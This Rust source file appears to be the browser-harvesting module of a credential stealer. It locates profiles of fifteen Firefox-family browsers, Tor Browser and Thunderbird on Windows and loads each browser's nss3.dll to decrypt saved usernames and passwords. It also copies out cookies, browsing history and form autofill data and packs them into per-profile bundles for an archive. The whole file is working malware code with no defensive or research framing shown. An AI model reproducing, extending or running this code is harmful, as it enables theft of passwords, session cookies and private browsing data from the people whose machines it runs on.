use std::{env, ffi, fs, path::{Path, PathBuf}};
use rusqlite::Connection;
use base64::{engine::general_purpose, Engine as _};
use serde_json::Value;

struct GeckoBrowserInfo {
    name: &'static str,
    profiles_path: PathBuf,
}

fn get_browsers() -> Vec<GeckoBrowserInfo> {
    let roaming = env::var("APPDATA").unwrap_or_default();
    let local = env::var("LOCALAPPDATA").unwrap_or_default();

    vec![
        GeckoBrowserInfo {
            name: "Firefox",
            profiles_path: PathBuf::from(&roaming).join("Mozilla").join("Firefox").join("Profiles"),
        },
        GeckoBrowserInfo {
            name: "Firefox ESR",
            profiles_path: PathBuf::from(&roaming).join("Mozilla").join("Firefox ESR").join("Profiles"),
        },
        GeckoBrowserInfo {
            name: "Firefox Developer",
            profiles_path: PathBuf::from(&roaming)
                .join("Mozilla")
                .join("Firefox Developer Edition")
                .join("Profiles"),
        },
        GeckoBrowserInfo {
            name: "Waterfox",
            profiles_path: PathBuf::from(&roaming).join("Waterfox").join("Profiles"),
        },
        GeckoBrowserInfo {
            name: "Waterfox G5",
            profiles_path: PathBuf::from(&roaming).join("Waterfox").join("Waterfox").join("Profiles"),
        },
        GeckoBrowserInfo {
            name: "LibreWolf",
            profiles_path: PathBuf::from(&roaming).join("librewolf").join("Profiles"),
        },
        GeckoBrowserInfo {
            name: "PaleMoon",
            profiles_path: PathBuf::from(&roaming)
                .join("Moonchild Productions")
                .join("Pale Moon")
                .join("Profiles"),
        },
        GeckoBrowserInfo {
            name: "Basilisk",
            profiles_path: PathBuf::from(&roaming)
                .join("Moonchild Productions")
                .join("Basilisk")
                .join("Profiles"),
        },
        GeckoBrowserInfo {
            name: "SeaMonkey",
            profiles_path: PathBuf::from(&roaming).join("Mozilla").join("SeaMonkey").join("Profiles"),
        },
        GeckoBrowserInfo {
            name: "Floorp",
            profiles_path: PathBuf::from(&roaming).join("Floorp").join("Profiles"),
        },
        GeckoBrowserInfo {
            name: "Thunderbird",
            profiles_path: PathBuf::from(&roaming).join("Thunderbird").join("Profiles"),
        },
        GeckoBrowserInfo {
            name: "Tor Browser",
            profiles_path: PathBuf::from(&local)
                .join("Tor Browser")
                .join("Browser")
                .join("TorBrowser")
                .join("Data")
                .join("Browser"),
        },
        GeckoBrowserInfo {
            name: "K-Meleon",
            profiles_path: PathBuf::from(&roaming).join("K-Meleon").join("Profiles"),
        },
        GeckoBrowserInfo {
            name: "IceDragon",
            profiles_path: PathBuf::from(&roaming).join("Comodo").join("IceDragon").join("Profiles"),
        },
        GeckoBrowserInfo {
            name: "Cyberfox",
            profiles_path: PathBuf::from(&roaming).join("8pecxstudios").join("Cyberfox").join("Profiles"),
        },
    ]
}

// ── Browser installation discovery (NSS) ────────────────────────────────────

fn nss_candidates(browser_name: &str) -> Vec<PathBuf> {
    let pf = env::var("ProgramFiles").unwrap_or_default();
    let pf86 = env::var("ProgramFiles(x86)").unwrap_or_default();
    let local = env::var("LOCALAPPDATA").unwrap_or_default();

    match browser_name {
        "Firefox" => vec![
            PathBuf::from(&pf).join("Mozilla Firefox"),
            PathBuf::from(&pf86).join("Mozilla Firefox"),
        ],
        "Firefox ESR" => vec![
            PathBuf::from(&pf).join("Mozilla Firefox ESR"),
            PathBuf::from(&pf86).join("Mozilla Firefox ESR"),
            PathBuf::from(&pf).join("Mozilla Firefox"),
        ],
        "Firefox Developer" => vec![
            PathBuf::from(&pf).join("Firefox Developer Edition"),
            PathBuf::from(&pf86).join("Firefox Developer Edition"),
            PathBuf::from(&pf).join("Mozilla Firefox"),
        ],
        "Waterfox" | "Waterfox G5" => vec![
            PathBuf::from(&pf).join("Waterfox"),
            PathBuf::from(&pf86).join("Waterfox"),
            PathBuf::from(&local).join("Waterfox"),
        ],
        "LibreWolf" => vec![
            PathBuf::from(&pf).join("LibreWolf"),
            PathBuf::from(&pf86).join("LibreWolf"),
            PathBuf::from(&local).join("librewolf"),
        ],
        "PaleMoon" => vec![
            PathBuf::from(&pf).join("Moonchild Productions").join("Pale Moon"),
            PathBuf::from(&pf86).join("Moonchild Productions").join("Pale Moon"),
            PathBuf::from(&pf).join("Pale Moon"),
        ],
        "Basilisk" => vec![
            PathBuf::from(&pf).join("Moonchild Productions").join("Basilisk"),
            PathBuf::from(&pf86).join("Moonchild Productions").join("Basilisk"),
        ],
        "SeaMonkey" => vec![
            PathBuf::from(&pf).join("SeaMonkey"),
            PathBuf::from(&pf86).join("SeaMonkey"),
        ],
        "Floorp" => vec![
            PathBuf::from(&pf).join("Floorp"),
            PathBuf::from(&pf86).join("Floorp"),
            PathBuf::from(&local).join("Floorp"),
        ],
        "Thunderbird" => vec![
            PathBuf::from(&pf).join("Mozilla Thunderbird"),
            PathBuf::from(&pf86).join("Mozilla Thunderbird"),
        ],
        "Tor Browser" => vec![
            PathBuf::from(&local).join("Tor Browser").join("Browser"),
            PathBuf::from(&pf).join("Tor Browser").join("Browser"),
        ],
        "K-Meleon" => vec![
            PathBuf::from(&pf).join("K-Meleon"),
            PathBuf::from(&pf86).join("K-Meleon"),
        ],
        "IceDragon" => vec![
            PathBuf::from(&pf).join("Comodo").join("IceDragon"),
            PathBuf::from(&pf86).join("Comodo").join("IceDragon"),
        ],
        "Cyberfox" => vec![
            PathBuf::from(&pf).join("Cyberfox"),
            PathBuf::from(&pf86).join("Cyberfox"),
        ],
        _ => vec![
            PathBuf::from(&pf).join("Mozilla Firefox"),
            PathBuf::from(&pf86).join("Mozilla Firefox"),
        ],
    }
}

fn find_nss_dir(browser_name: &str) -> Option<PathBuf> {
    for path in nss_candidates(browser_name) {
        if path.join("nss3.dll").exists() {
            return Some(path);
        }
    }
    None
}

// ── NSS FFI types ──────────────────────────────────────────────────────────

#[repr(C)]
struct SECItem {
    item_type: u32,
    data: *mut u8,
    len: u32,
}

// ── NSS-based password decryption ──────────────────────────────────────────

fn decrypt_nss_value(nss_lib: &libloading::Library, encrypted_b64: &str) -> Option<String> {
    let encrypted = general_purpose::STANDARD.decode(encrypted_b64).ok()?;

    unsafe {
        let pk11sdr_decrypt: libloading::Symbol<
            unsafe extern "C" fn(*mut SECItem, *mut SECItem, *mut ffi::c_void) -> i32,
        > = nss_lib.get(b"PK11SDR_Decrypt").ok()?;

        let mut input = SECItem {
            item_type: 0,
            data: encrypted.as_ptr() as *mut u8,
            len: encrypted.len() as u32,
        };

        let mut output = SECItem {
            item_type: 0,
            data: std::ptr::null_mut(),
            len: 0,
        };

        let status = pk11sdr_decrypt(&mut input, &mut output, std::ptr::null_mut());

        if status == 0 && !output.data.is_null() && output.len > 0 {
            let result =
                std::slice::from_raw_parts(output.data, output.len as usize).to_vec();

            // Free the allocated data
            if let Ok(free_fn) =
                nss_lib.get::<unsafe extern "C" fn(*mut SECItem, i32)>(b"SECITEM_ZfreeItem")
            {
                free_fn(&mut output, 0); // 0 = only free data, not the struct
            }

            String::from_utf8(result).ok()
        } else {
            None
        }
    }
}

/// Extract passwords from a single Firefox profile using NSS
fn extract_passwords_nss(profile_path: &Path, nss_dir: &Path) -> Option<String> {
    let logins_path = profile_path.join("logins.json");
    if !logins_path.exists() {
        return None;
    }
    if !profile_path.join("key4.db").exists() && !profile_path.join("key3.db").exists() {
        return None;
    }

    // Prepend browser dir to PATH so nss3.dll can find its dependency DLLs
    let original_path = env::var("PATH").unwrap_or_default();
    #[allow(unused_unsafe)]
    unsafe {
        env::set_var("PATH", format!("{};{}", nss_dir.display(), original_path));
    }

    let result = (|| -> Option<String> {
        let nss_lib =
            unsafe { libloading::Library::new(nss_dir.join("nss3.dll")).ok()? };

        // Initialize NSS with the profile directory
        unsafe {
            let profile_cstr =
                ffi::CString::new(profile_path.to_string_lossy().as_bytes()).ok()?;

            let mut status = if let Ok(nss_init) = nss_lib
                .get::<unsafe extern "C" fn(*const ffi::c_char) -> i32>(b"NSS_Init")
            {
                nss_init(profile_cstr.as_ptr())
            } else {
                -1
            };

            if status != 0 {
                if let Ok(nss_init_ro) = nss_lib
                    .get::<unsafe extern "C" fn(*const ffi::c_char) -> i32>(b"NSS_InitReadOnly")
                {
                    status = nss_init_ro(profile_cstr.as_ptr());
                }
            }

            if status != 0 {
                return None;
            }
        }

        // Read logins.json
        let content = fs::read_to_string(&logins_path).ok()?;
        let json: Value = serde_json::from_str(&content).ok()?;
        let logins = json["logins"].as_array()?;

        let mut output = String::new();
        for login in logins {
            let hostname = login["hostname"].as_str().unwrap_or("N/A");
            let enc_username = login["encryptedUsername"].as_str().unwrap_or("");
            let enc_password = login["encryptedPassword"].as_str().unwrap_or("");

            let username = decrypt_nss_value(&nss_lib, enc_username)
                .unwrap_or_else(|| "[decryption failed]".to_string());
            let password = decrypt_nss_value(&nss_lib, enc_password)
                .unwrap_or_else(|| "[decryption failed]".to_string());

            output.push_str(&format!(
                "URL: {}\nUsername: {}\nPassword: {}\n{}\n",
                hostname,
                username,
                password,
                "-".repeat(50)
            ));
        }

        // Shutdown NSS
        unsafe {
            if let Ok(nss_shutdown) =
                nss_lib.get::<unsafe extern "C" fn() -> i32>(b"NSS_Shutdown")
            {
                let _ = nss_shutdown();
            }
        }

        if output.is_empty() { None } else { Some(output) }
    })();

    // Restore original PATH
    #[allow(unused_unsafe)]
    unsafe {
        env::set_var("PATH", original_path);
    }
    result
}

// ── SQLite helpers ─────────────────────────────────────────────────────────

fn copy_db(db_path: &Path) -> Option<PathBuf> {
    if !db_path.exists() {
        return None;
    }
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let temp = env::temp_dir().join(format!("gk_db_{}.sqlite", nanos));
    fs::copy(db_path, &temp).ok()?;

    // Copy WAL/SHM if present
    let db_name = db_path.to_string_lossy().to_string();
    let temp_name = temp.to_string_lossy().to_string();
    for suffix in ["-wal", "-shm", "-journal"] {
        let src = PathBuf::from(format!("{}{}", db_name, suffix));
        if src.exists() {
            let dst = PathBuf::from(format!("{}{}", temp_name, suffix));
            let _ = fs::copy(&src, &dst);
        }
    }

    Some(temp)
}

fn cleanup_db(temp: &Path) {
    let temp_name = temp.to_string_lossy().to_string();
    for suffix in ["", "-wal", "-shm", "-journal"] {
        let path = PathBuf::from(format!("{}{}", temp_name, suffix));
        let _ = fs::remove_file(&path);
    }
}

// ── Extraction functions ───────────────────────────────────────────────────

fn extract_cookies(profile_path: &Path) -> Option<String> {
    let temp = copy_db(&profile_path.join("cookies.sqlite"))?;
    let conn = Connection::open(&temp).ok()?;

    let mut stmt = conn
        .prepare("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
        .ok()?;

    let mut body = String::new();
    let rows = stmt
        .query_map([], |row| {
            let host: String = row.get(0)?;
            let name: String = row.get(1)?;
            let value: String = row.get(2)?;
            let path: String = row.get(3)?;
            let expiry: i64 = row.get(4)?;
            let is_secure: i32 = row.get(5)?;
            let is_httponly: i32 = row.get(6)?;
            Ok((host, name, value, path, expiry, is_secure, is_httponly))
        })
        .ok()?;

    let mut count = 0;
    for row in rows.flatten() {
        let (host, name, value, path, expiry, is_secure, is_httponly) = row;
        if name.is_empty() {
            continue;
        }
        body.push_str(&super::netscape::format_line(
            &host,
            &path,
            is_secure != 0,
            expiry,
            &name,
            &value,
            is_httponly != 0,
        ));
        count += 1;
    }

    drop(stmt);
    drop(conn);
    cleanup_db(&temp);
    if count == 0 {
        Some(super::netscape::empty_file())
    } else {
        super::netscape::build_file(&body)
    }
}

fn extract_history(profile_path: &Path) -> Option<String> {
    let temp = copy_db(&profile_path.join("places.sqlite"))?;
    let conn = Connection::open(&temp).ok()?;

    let mut stmt = conn
        .prepare(
            "SELECT url, title, visit_count, last_visit_date \
             FROM moz_places WHERE visit_count > 0 \
             ORDER BY last_visit_date DESC",
        )
        .ok()?;

    let mut output = String::new();
    let rows = stmt
        .query_map([], |row| {
            let url: String = row.get(0)?;
            let title: Option<String> = row.get(1)?;
            let visit_count: i64 = row.get(2)?;
            let last_visit: Option<i64> = row.get(3)?;
            Ok((url, title, visit_count, last_visit))
        })
        .ok()?;

    for row in rows.flatten() {
        let (url, title, visit_count, last_visit) = row;
        output.push_str(&format!(
            "URL: {}\nTitle: {}\nVisits: {}\nLast Visit: {}\n{}\n",
            url,
            title.unwrap_or_default(),
            visit_count,
            last_visit.unwrap_or(0),
            "-".repeat(50)
        ));
    }

    drop(stmt);
    drop(conn);
    cleanup_db(&temp);
    if output.is_empty() { None } else { Some(output) }
}

fn extract_autofill(profile_path: &Path) -> Option<String> {
    let temp = copy_db(&profile_path.join("formhistory.sqlite"))?;
    let conn = Connection::open(&temp).ok()?;

    let mut stmt = conn
        .prepare("SELECT fieldname, value, timesUsed FROM moz_formhistory")
        .ok()?;

    let mut output = String::new();
    let rows = stmt
        .query_map([], |row| {
            let name: String = row.get(0)?;
            let value: String = row.get(1)?;
            let count: i64 = row.get(2)?;
            Ok((name, value, count))
        })
        .ok()?;

    for row in rows.flatten() {
        let (name, value, count) = row;
        output.push_str(&format!(
            "Field: {}\nValue: {}\nUsed: {}\n{}\n",
            name,
            value,
            count,
            "-".repeat(50)
        ));
    }

    drop(stmt);
    drop(conn);
    cleanup_db(&temp);
    if output.is_empty() { None } else { Some(output) }
}

// ── Profile discovery ──────────────────────────────────────────────────────

fn display_profile_name(ini_name: &str) -> String {
    if ini_name.eq_ignore_ascii_case("default") {
        "Default".to_string()
    } else {
        ini_name.to_string()
    }
}

fn push_ini_profile(
    profiles: &mut Vec<(String, PathBuf)>,
    profiles_dir: &Path,
    name: &str,
    path: &str,
) {
    let profile_path = if Path::new(path).is_absolute() {
        PathBuf::from(path)
    } else {
        profiles_dir.join(path)
    };
    if profile_path.is_dir() {
        profiles.push((display_profile_name(name), profile_path));
    }
}

fn parse_profiles_ini(ini: &Path, profiles_dir: &Path) -> Vec<(String, PathBuf)> {
    let content = match fs::read_to_string(ini) {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };

    let mut profiles = Vec::new();
    let mut current_name: Option<String> = None;
    let mut current_path: Option<String> = None;

    for line in content.lines() {
        let line = line.trim();
        if line.starts_with('[') && line.contains(']') {
            if let (Some(name), Some(path)) = (current_name.take(), current_path.take()) {
                push_ini_profile(&mut profiles, profiles_dir, &name, &path);
            }
            continue;
        }
        if let Some((key, value)) = line.split_once('=') {
            match key.trim() {
                "Name" => current_name = Some(value.trim().to_string()),
                "Path" => current_path = Some(value.trim().to_string()),
                _ => {}
            }
        }
    }
    if let (Some(name), Some(path)) = (current_name, current_path) {
        push_ini_profile(&mut profiles, profiles_dir, &name, &path);
    }
    profiles
}

fn get_profiles(profiles_dir: &Path) -> Vec<(String, PathBuf)> {
    let ini_in_dir = profiles_dir.join("profiles.ini");
    if ini_in_dir.exists() {
        let parsed = parse_profiles_ini(&ini_in_dir, profiles_dir);
        if !parsed.is_empty() {
            return parsed;
        }
    }

    if let Some(parent) = profiles_dir.parent() {
        let ini = parent.join("profiles.ini");
        if ini.exists() {
            let parsed = parse_profiles_ini(&ini, profiles_dir);
            if !parsed.is_empty() {
                return parsed;
            }
        }
    }

    let mut profiles = Vec::new();
    if let Ok(entries) = fs::read_dir(profiles_dir) {
        for entry in entries.flatten() {
            if entry.path().is_dir() {
                let name = entry.file_name().to_string_lossy().to_string();
                profiles.push((name, entry.path()));
            }
        }
    }
    profiles
}

// ── Public entry point ─────────────────────────────────────────────────────

pub fn extract_all() -> Vec<(String, String)> {
    let mut results = Vec::new();

    for browser in get_browsers() {
        if !browser.profiles_path.exists() {
            continue;
        }

        let nss_dir = find_nss_dir(browser.name);
        let profiles = get_profiles(&browser.profiles_path);

        for (profile_name, profile_path) in profiles {
            let passwords = nss_dir
                .as_ref()
                .and_then(|dir| extract_passwords_nss(&profile_path, dir));
            let cookies = extract_cookies(&profile_path);
            let history = extract_history(&profile_path);
            let autofill = extract_autofill(&profile_path);

            super::zip_layout::push_profile_bundle(
                &mut results,
                browser.name,
                &profile_name,
                passwords,
                cookies,
                autofill,
                history,
            );
        }
    }

    results
}
